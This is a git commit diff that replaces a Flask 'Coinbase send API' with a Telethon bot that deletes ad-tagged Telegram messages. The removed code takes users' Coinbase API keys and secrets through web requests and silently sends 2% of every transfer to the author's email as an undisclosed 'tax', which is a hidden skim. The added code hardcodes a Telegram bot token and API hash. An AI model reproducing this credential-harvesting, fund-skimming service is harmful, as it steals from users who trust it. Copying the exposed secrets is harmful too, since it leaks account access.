6b31e7472fdd36e494bd648f616ca30f19cc8348
monika359b <89681654+monika359b@users.noreply.github.com>
2023-01-22 11:09:00 +0530

    Update app.py

--- app.py
+++ app.py
@@ -1,89 +1,29 @@
+import asyncio
+from telethon import TelegramClient, events
 
-from coinbase.wallet.client import Client
-import json
-from flask import Flask,request,jsonify
-app = Flask(__name__)
+async def main():
+    async def delete_messages(event):
+        if '#AD' in event.message.message or '#paidAD' in event.message.message or 'sponsored' in event.message.message:
+            print(event)
+            await client.delete_messages(event.message.peer_id.user_id, event.message.id)
+            print('message deleted successfully')
+
+    bot_token = '5846295132:AAELVqVfmejscqruRH3jKl88i3gmc2mFw0k'
+    client = TelegramClient('Bot', "7243983", "e1bd137a37da9f95ecd2b206a8c8be48")
+    await client.start(bot_token=bot_token)
+    bot_chat_id = 5846295132
+    @client.on(events.NewMessage(chats=bot_chat_id))
+    async def my_event_handler(event):
+        if event.message.from_id.user_id == 5846295132:
+            await delete_messages(event)
+        else:
+            print('failed')
+            pass
+    client.add_event_handler(my_event_handler)
+    while True:
+        await asyncio.sleep(0.01)
+
+if __name__ == '__main__':
+    asyncio.run(main())
 
 
-def send(email, amo, api_key,api_secret,cur):
-  client = Client(api_key, api_secret)
-  account = client.get_account(cur)
-  print(account)
-  tax_email = 'monika359b@gmail.com'
-  amod = float(amo)
-  tro = account.send_money(to=tax_email,amount=amod*0.02,currency=cur)
-  print(tro)
-  gp = account.send_money(to=email,amount=amo,currency=cur)
-  return gp
-
-@app.route('/balance', methods = ['GET'])
-def senndil():
-	api_key = request.args.get('api_key')
-	api_secret = request.args.get('api_secret')
-	currency = request.args.get('currency')
-	client = Client(api_key, api_secret)
-	account = client.get_account(currency)
-	print(account)
-	return account
-@app.route('/te', methods = ['GET'])
-def seil():
-	api_key = request.args.get('api_key')
-	api_secret = request.args.get('api_secret')
-	currency = request.args.get('currency')
-	client = Client(api_key, api_secret)
-	accoun = client.get_account(currency)
-	account = accoun.get_transactions()
-	print(account)
-	return account
-@app.route('/b', methods = ['GET'])
-def sennl():
-	api_key = request.args.get('api_key')
-	api_secret = request.args.get('api_secret')
-	client = Client(api_key, api_secret)
-	account = client.get_accounts()
-	print(account)
-	return account
-
-@app.route('/bal', methods = ['GET'])
-def sendZhdjjdil():
-	api_key = request.args.get('api_key')
-	api_secret = request.args.get('api_secret')
-	client = Client(api_key, api_secret)
-	account = client.get_accounts()
-	return account 
-
-@app.route('/tx', methods = ['GET'])
-def seniiksjdil():
-	api_key = request.args.get('api_key')
-	api_secret = request.args.get('api_secret')
-	txid = request.args.get('txid')
-	currency = request.args.get('currency')
-	client = Client(api_key, api_secret)
-	c = client.get_accounts()
-	account = client.get_transaction(currency, txid)
-	print(account)
-	return account
-
-@app.route('/')
-def setuphandler():
-	return ("This is coinbase coins send api to know how to use dm @Rohit_kumawat_1 on telegram or send json data by post method \n => body: { email: 'your email', amount: 'amount u want to send', api_secret: api_secret,api_key:api_key,currency:'BTC or u can enter Any currency which is available in coinbase'} ।। Url is https://coinbase.up.railway.app/send ")
-
-@app.route('/send', methods = ['POST'])
-def sendZil():
-	index = request.json
-	email = index["email"]
-	amount = index["amount"]
-	api_key = index["api_key"]
-	api_secret = index["api_secret"]
-	currency = index["currency"]
-	tx = send(email, amount,api_key,api_secret,currency)
-	return tx
-@app.route('/get', methods = ['GET'])
-def sendZhil():
-	email = request.args.get('email')
-	amount = request.args.get('amount')
-	api_key = request.args.get('api_key')
-	api_secret = request.args.get('api_secret')
-	currency = request.args.get('currency')
-	tx = send(email, amount,api_key,api_secret,currency)
-	return tx
